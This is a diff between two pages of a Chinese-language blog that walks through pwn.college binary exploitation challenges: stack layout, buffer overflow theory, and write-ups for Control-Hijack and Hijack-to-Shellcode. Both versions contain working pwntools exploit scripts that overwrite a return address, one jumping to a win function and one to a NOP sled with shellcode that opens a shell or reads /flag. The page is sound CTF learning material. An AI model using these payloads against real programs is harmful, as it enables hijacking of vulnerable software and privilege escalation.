@@ -19,31 +19,24 @@
   <meta name="author" content="">
   <meta name="keywords" content="">
   
-    <meta name="description" content="简介这一篇博客会把二进制利用的知识串起来，同时穿插pwn.college的题解，帮助自己理解和巩固。">
+    <meta name="description" content="题目简介基础的栈溢出，在&#x2F;challenge目录下仅存在一个ELF文件，无源代码，需要我们构造输入劫持返回地址，根据题目名字能猜到是要劫持到shellcode起始地址 漏洞点分析分析一个程序首先要分析有没有溢出点，溢出点在哪里。分析方法和上一题一致，这里省略接下来用checksec看一下开了哪些保护发现保护全关，因此漏洞点就是缓冲区溢出覆写返回地址，劫持到我们的shellcode 漏洞点">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Binary-Exp">
-<meta property="og:url" content="http://0x4a-210.github.io/2025/07/19/pwn.college/TogetherReview/Binary-Exp/index.html">
+<meta property="og:title" content="Hijack-to-Shellcode">
+<meta property="og:url" content="http://0x4a-210.github.io/2025/07/16/pwn.college/Intro-to-Cybersecurity/Pwn/Hijack-to-Shellcode/index.html">
 <meta property="og:site_name" content="0x4A">
-<meta property="og:description" content="简介这一篇博客会把二进制利用的知识串起来，同时穿插pwn.college的题解，帮助自己理解和巩固。">
+<meta property="og:description" content="题目简介基础的栈溢出，在&#x2F;challenge目录下仅存在一个ELF文件，无源代码，需要我们构造输入劫持返回地址，根据题目名字能猜到是要劫持到shellcode起始地址 漏洞点分析分析一个程序首先要分析有没有溢出点，溢出点在哪里。分析方法和上一题一致，这里省略接下来用checksec看一下开了哪些保护发现保护全关，因此漏洞点就是缓冲区溢出覆写返回地址，劫持到我们的shellcode 漏洞点">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/TogetherReview/stack.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/TogetherReview/Control-Hijack/main.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/TogetherReview/Control-Hijack/challenge.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/TogetherReview/Control-Hijack/win.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/TogetherReview/Control-Hijack/checksec.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/TogetherReview/Control-Hijack/objdump.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/TogetherReview/Control-Hijack/flag.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/TogetherReview/Hijack-to-Shellcode/checksec.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/TogetherReview/Hijack-to-Shellcode/ret-breakpoint.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/TogetherReview/Hijack-to-Shellcode/flag.png">
-<meta property="article:published_time" content="2025-07-19T00:59:21.000Z">
-<meta property="article:modified_time" content="2025-07-19T06:39:30.363Z">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/checksec.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/ret-breakpoint.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/flag.png">
+<meta property="article:published_time" content="2025-07-16T01:07:03.000Z">
+<meta property="article:modified_time" content="2025-07-20T01:09:18.705Z">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn.college/TogetherReview/stack.png">
+<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/checksec.png">
   
   
   
-  <title>Binary-Exp - 0x4A</title>
+  <title>Hijack-to-Shellcode - 0x4A</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -197,7 +190,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Binary-Exp"></span>
+            <span id="subtitle" data-typed-text="Hijack-to-Shellcode"></span>
           
         </div>
 
@@ -208,8 +201,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-07-19 08:59" pubdate>
-          July 19, 2025 am
+        <time datetime="2025-07-16 09:07" pubdate>
+          July 16, 2025 am
         </time>
       </span>
     
@@ -220,7 +213,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k words
+          789 words
         
       </span>
     
@@ -231,7 +224,7 @@
         
         
         
-          18 mins
+          7 mins
         
       </span>
     
@@ -268,32 +261,18 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Binary-Exp</h1>
+            <h1 id="seo-header">Hijack-to-Shellcode</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这一篇博客会把二进制利用的知识串起来，同时穿插pwn.college的题解，帮助自己理解和巩固。<br></p>
-<span id="more"></span>
-<p>内容会随着博主掌握的内容而更新，目前只到ROP栈迁移部分（基本对应pwn.college上的intro&#x2F;Binary Exploitation的全部以及program security&#x2F;ROP的level1-9），当然博主也是新手，有写错的地方勿怪<br><br>（声明：这篇博客所有记录默认是以64位架构为前提）</p>
-<h1 id="基础部分随记"><a href="#基础部分随记" class="headerlink" title="基础部分随记"></a>基础部分随记</h1><h2 id="栈结构与函数调用"><a href="#栈结构与函数调用" class="headerlink" title="栈结构与函数调用"></a>栈结构与函数调用</h2><p>首先个人觉得做二进制的题目，最基本的是需要了解栈结构。<br><br><em><strong>栈的内存空间是从高地址向低地址增长，也就是说，每当有东西进栈，rsp将会-1，每当有东西出栈，rsp将会+1</strong></em><br><br>每个函数在调用的过程中会维护自己的一块在栈上的内存空间，被称为栈帧；<br><br><em><strong>函数在被调用时，首先会进行传参，但是否传入栈上，得看架构和参数个数；比如根据64位系统调用约定，前6个参数依次从rdi、rsi、rdx、rcx、r8、r9中读取，因此当参数个数超过6个，才通过栈传参（当然32位就是全用栈传参）</strong></em><br><em><strong>传参完成后会将下一条指令的地址压栈，即push rip，该地址被称为返回地址，这个动作由call指令自动完成</strong></em><br><br><em><strong>接下来会进入函数的所谓“序言”部分，即执行：压rbp入栈（push rbp）-&gt;把rsp的值赋给rbp（mov rbp,rsp）-&gt;rsp向低地址移动（sub rsp）</strong></em><br><br>（备注：后续回顾时重点理解函数被调用时的进栈流程，和leave ret对应起来理解）<br><br>此时，函数的栈帧已经形成，栈的最高处是调用者的rbp，最低处是rsp，函数运行时的局部变量存在栈帧的靠近低处<br><br>从rbp到局部变量，中间的内容需要具体分析，可能会有canary等数据<br><br>综上，可以画出栈的一个示意图如下：<br><br><img src="/../../../../../../photos/pwn.college/TogetherReview/stack.png" srcset="/img/loading.gif" lazyload><br>函数调用结束后，一般末尾会有leave和ret指令，这两条指令的等价形式如下：<br><br><em><strong>leave&#x3D;mov rsp,rbp;pop rbp，ret &#x3D;pop rip</strong></em><br><em><strong>此时可以发现，这些操作正好对应着函数序言，即可以理解为序言的反操作，这也就是为什么函数在调用过后还能回到原来的地方继续执行（返回地址实现），同时调用者的栈帧也能恢复（rbp的入栈出栈实现）</strong></em></p>
-<h2 id="缓冲区溢出原理"><a href="#缓冲区溢出原理" class="headerlink" title="缓冲区溢出原理"></a>缓冲区溢出原理</h2><p>分析上述栈结构和函数调用过程，可以发现局部变量（用户输入的缓冲区）是在返回地址下方，而用户输入是不可控的，如果没有长度校验，可以通过构造过长的输入去覆盖返回地址，从而劫持函数的执行流<br><br>最后一个问题：返回地址应该覆盖为什么？根据目前做题经验，总结为以下三类：<br><br>1.后门函数的地址（pwn题当中常见为名叫win的函数）<br><br>2.攻击者自己写的shellcode的起始地址<br><br>3.攻击者构造的ROP链的起始地址（即链条中第一条指令碎片的地址）<br><br>接下来以3道pwn.college上的题目具体分析</p>
-<h1 id="pwn-college题解"><a href="#pwn-college题解" class="headerlink" title="pwn.college题解"></a>pwn.college题解</h1><h2 id="1-Control-Hijack-hard"><a href="#1-Control-Hijack-hard" class="headerlink" title="1 Control-Hijack(hard)"></a>1 Control-Hijack(hard)</h2><h3 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h3><p>需要我们劫持函数的控制流，但具体劫持到哪，需要反汇编整个程序来决定</p>
-<h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>首先将&#x2F;challenge下的二进制文件下载到本地，拖到IDA里看一下，（F5反编译，即看C伪代码）<br><br>个人习惯首先观察main函数<br><br><img src="/../../../../../../photos/pwn.college/TogetherReview/Control-Hijack/main.png" srcset="/img/loading.gif" lazyload><br>可以看到main调用了challenge，并且main里面没有发现溢出点，那只能进challenge里看一下<br><br><img src="/../../../../../../photos/pwn.college/TogetherReview/Control-Hijack/challenge.png" srcset="/img/loading.gif" lazyload><br>很好，在challenge中找到了溢出点read，给了4096个字节，但缓冲区只有14个字节，完全够覆盖到返回地址<br><br>同时，观察左侧函数名一栏存在一个win函数，点进去看一下，发现是输出flag的功能，如图<br><br><img src="/../../../../../../photos/pwn.college/TogetherReview/Control-Hijack/win.png" srcset="/img/loading.gif" lazyload><br>至此，漏洞点就清晰了，我们需要覆盖返回地址为win函数的地址，劫持challenge函数的控制流</p>
-<h3 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h3><p>首先确定缓冲区到返回地址的偏移，注意challenge函数反编译的截图，在第5行buf变量后面有一个[rbp-80H]的字段，联系栈帧结构，可以知道返回地址在缓冲区的高0x80+0x8&#x3D;136字节处<br><br>之后确定win函数地址，首先checksec命令查看程序开启了哪些保护<br></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">checksec /challenge/binary-exploitation-control-hijack<br></code></pre></td></tr></table></figure>
-<p>如下图，发现没有开启PIE，说明程序每次会被加载到固定的基地址（0x400000）<br><br><img src="/../../../../../../photos/pwn.college/TogetherReview/Control-Hijack/checksec.png" srcset="/img/loading.gif" lazyload><br>因此采用objdump命令进行反汇编，直接拿到win的地址<br></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">objdump -d /challenge/binary-exploitation-control-hijack<br></code></pre></td></tr></table></figure>
-<p><img src="/../../../../../../photos/pwn.college/TogetherReview/Control-Hijack/objdump.png" srcset="/img/loading.gif" lazyload><br>可以看到win函数在0x401c20的地方<br><br>因此可以编写出如下利用脚本了<br></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>ioHandler=process(<span class="hljs-string">&quot;/challenge/binary-exploitation-control-hijack&quot;</span>)<br>offset=<span class="hljs-number">136</span><br>winAddr=<span class="hljs-number">0x401c20</span><br>ioHandler.recvuntil(<span class="hljs-string">&quot;Send your payload (up to 4096 bytes)!\n&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(winAddr)<br>ioHandler.send(payload)<br>flag=ioHandler.recvall().decode()<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
-<p>直接运行即可拿到flag了<br><br><img src="/../../../../../../photos/pwn.college/TogetherReview/Control-Hijack/flag.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="2-Hijack-to-Shellcode-hard"><a href="#2-Hijack-to-Shellcode-hard" class="headerlink" title="2 Hijack-to-Shellcode(hard)"></a>2 Hijack-to-Shellcode(hard)</h2><h3 id="题目简介-1"><a href="#题目简介-1" class="headerlink" title="题目简介"></a>题目简介</h3><p>基础的栈溢出，在&#x2F;challenge目录下仅存在一个ELF文件，无源代码，需要我们构造输入劫持返回地址，根据题目名字能猜到是要劫持到shellcode起始地址</p>
-<h3 id="漏洞点分析-1"><a href="#漏洞点分析-1" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>分析一个程序首先要分析有没有溢出点，溢出点在哪里。分析方法和上一题一致，这里省略<br><br>接下来用checksec看一下开了哪些保护<br><br><img src="/../../../../../../photos/pwn.college/TogetherReview/Hijack-to-Shellcode/checksec.png" srcset="/img/loading.gif" lazyload><br>发现保护全关，因此漏洞点就是缓冲区溢出覆写返回地址，劫持到我们的shellcode<br></p>
-<h3 id="漏洞点利用-1"><a href="#漏洞点利用-1" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h3><p>首先确定偏移量，可以采用和上一题相同的方法，最后计算得到偏移量&#x3D;120<br><br>第二步需要确定返回地址，即我们的shellcode的起始地址是哪，首先很自然想到将shellcode放在返回地址后面<br><br>通过gdb，在challenge函数的ret指令处打下断点，程序将停在ret指令之前，此时再次使用x命令查看$rsp，由于ret本质是进行pop rip操作，因此rsp此时指向的第一个内存格子就是返回地址,如下图<br><br><img src="/../../../../../../photos/pwn.college/TogetherReview/Hijack-to-Shellcode/ret-breakpoint.png" srcset="/img/loading.gif" lazyload><br>从图中看到返回地址&#x3D;0x7fffffffd608，因此应该将返回地址覆写为0x7fffffffd610，但是不能这么干，因为这样gdb调试得到的返回地址其实是不准确的，因为gdb会引入一些环境变量导致栈的空间改变<br><br>在实战中，更多采用NOP滑行的方法，即在真正的shellcode之前填入若干个NOP指令，返回地址只要确定一个大概范围，最后能命中这些NOP里的任何一个即可，这里我选择的是0x7fffffffd660，在返回地址后面0x50个字节。<br><br>现在可以编写出如下的exp了<br></p>
+                <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>基础的栈溢出，在&#x2F;challenge目录下仅存在一个ELF文件，无源代码，需要我们构造输入劫持返回地址，根据题目名字能猜到是要劫持到shellcode起始地址</p>
+<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>分析一个程序首先要分析有没有溢出点，溢出点在哪里。分析方法和上一题一致，这里省略<br><br>接下来用checksec看一下开了哪些保护<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/checksec.png" srcset="/img/loading.gif" lazyload><br>发现保护全关，因此漏洞点就是缓冲区溢出覆写返回地址，劫持到我们的shellcode<br></p>
+<h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定偏移量，可以采用和上一题相同的方法，最后计算得到偏移量&#x3D;120<br><br>第二步需要确定返回地址，即我们的shellcode的起始地址是哪，首先很自然想到将shellcode放在返回地址后面<br><br>通过gdb，在challenge函数的ret指令处打下断点，程序将停在ret指令之前，此时再次使用x命令查看$rsp，由于ret本质是进行pop rip操作，因此rsp此时指向的第一个内存格子就是返回地址,如下图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/ret-breakpoint.png" srcset="/img/loading.gif" lazyload><br>从图中看到返回地址&#x3D;0x7fffffffd608，因此应该将返回地址覆写为0x7fffffffd610，但是不能这么干，因为这样gdb调试得到的返回地址其实是不准确的，因为gdb会引入一些环境变量导致栈的空间改变<br><br>在实战中，更多采用NOP滑行的方法，即在真正的shellcode之前填入若干个NOP指令，返回地址只要确定一个大概范围，最后能命中这些NOP里的任何一个即可，这里我选择的是0x7fffffffd660，在返回地址后面0x50个字节。<br><br>现在可以编写出如下的exp了<br></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> os<br>returnAddr=<span class="hljs-number">0x7fffffffd660</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;/challenge/binary-exploitation-hijack-to-shellcode&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>payload=<span class="hljs-string">b&quot;1&quot;</span>*<span class="hljs-number">120</span>+p64(returnAddr)+<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x200</span>+shellcode<br>p.recvuntil(<span class="hljs-string">&#x27;Send your payload (up to 4096 bytes)!\n&#x27;</span>)<br>p.send(payload)<br>p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure>
-<h3 id="getshell的临门一脚"><a href="#getshell的临门一脚" class="headerlink" title="getshell的临门一脚"></a>getshell的临门一脚</h3><p>很遗憾，上述脚本实测无法打通，这是由于pwn.college的问题，子进程并没有继承root权限，导致读取&#x2F;flag文件时权限错误<br><br>至于为什么出现这种原因，怀疑是pwn.college服务器的sh是指向bash的，由于目标程序是通过SUID获得了root权限，而bash解释器默认会阻止SUID程序的子进程继承权限（不同于zsh等）。所以调用&#x2F;bin&#x2F;sh没有root<br><br>有2种办法解决，一个是在调用&#x2F;bin&#x2F;sh之前进行一次setuid(0)的操作，另一种是改一下shellcode，直接通过系统调用完成输出flag，我这题采用了后者<br><br>最终exp.py如下<br></p>
+<h1 id="getshell的临门一脚"><a href="#getshell的临门一脚" class="headerlink" title="getshell的临门一脚"></a>getshell的临门一脚</h1><p>很遗憾，上述脚本实测无法打通，这是由于pwn.college的问题，子进程并没有继承root权限，导致读取&#x2F;flag文件时权限错误<br><br>至于为什么出现这种原因，怀疑是pwn.college服务器的sh是指向bash的，由于目标程序是通过SUID获得了root权限，而bash解释器默认会阻止SUID程序的子进程继承权限（不同于zsh等）。所以调用&#x2F;bin&#x2F;sh没有root<br><br>有2种办法解决，一个是在调用&#x2F;bin&#x2F;sh之前进行一次setuid(0)的操作，另一种是改一下shellcode，直接通过系统调用完成输出flag，我这题采用了后者<br><br>最终exp.py如下<br></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> os<br>returnAddr=<span class="hljs-number">0x7fffffffd660</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;/challenge/binary-exploitation-hijack-to-shellcode&#x27;</span>)<br>shellcode= asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.intel_syntax noprefix</span><br><span class="hljs-string">mov r10,0x67616c662f2f2f2f</span><br><span class="hljs-string">shr r10,24</span><br><span class="hljs-string">push r10</span><br><span class="hljs-string">lea rdi,[rsp]</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 2</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi,rax</span><br><span class="hljs-string">sub rsp,100</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">push 100</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload=<span class="hljs-string">b&quot;1&quot;</span>*<span class="hljs-number">120</span>+p64(returnAddr)+<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x200</span>+shellcode<br>p.recvuntil(<span class="hljs-string">&#x27;Send your payload (up to 4096 bytes)!\n&#x27;</span>)<br>p.send(payload)<br>output = p.recvall()<br><span class="hljs-built_in">print</span>(output.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure>
-<p>最后也是成功拿到了flag<br><img src="/../../../../../../photos/pwn.college/TogetherReview/Hijack-to-Shellcode/flag.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后也是成功拿到了flag<br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/flag.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
@@ -312,17 +291,17 @@
     
       <span class="category-chain">
         
-  <a href="/categories/pwn-college/" class="category-chain-item">pwn.college</a>
+  <a href="/categories/pwn-college%E9%A2%98%E8%A7%A3/" class="category-chain-item">pwn.college题解</a>
   
   
     <span>></span>
     
-  <a href="/categories/pwn-college/%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%B2%E8%81%94/" class="category-chain-item">知识点串联</a>
+  <a href="/categories/pwn-college%E9%A2%98%E8%A7%A3/intro/" class="category-chain-item">intro</a>
   
   
     <span>></span>
     
-  <a href="/categories/pwn-college/%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%B2%E8%81%94/Pwn/" class="category-chain-item">Pwn</a>
+  <a href="/categories/pwn-college%E9%A2%98%E8%A7%A3/intro/Pwn/" class="category-chain-item">Pwn</a>
   
   
 
@@ -346,15 +325,15 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Binary-Exp</div>
-      <div>http://0x4a-210.github.io/2025/07/19/pwn.college/TogetherReview/Binary-Exp/</div>
+      <div>Hijack-to-Shellcode</div>
+      <div>http://0x4a-210.github.io/2025/07/16/pwn.college/Intro-to-Cybersecurity/Pwn/Hijack-to-Shellcode/</div>
     </div>
     <div class="license-meta">
       
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>July 19, 2025</div>
+          <div>July 16, 2025</div>
         </div>
       
       
@@ -386,9 +365,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/" title="PIEs-hard">
+                      <a href="/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/XSS-7/" title="XSS-7">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">PIEs-hard</span>
+                        <span class="hidden-mobile">XSS-7</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -396,8 +375,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-5/" title="CSRF-5">
-                        <span class="hidden-mobile">CSRF-5</span>
+                      <a href="/2025/07/15/pwn.college/Intro-to-Cybersecurity/Web/XSS-5/" title="XSS-5">
+                        <span class="hidden-mobile">XSS-5</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
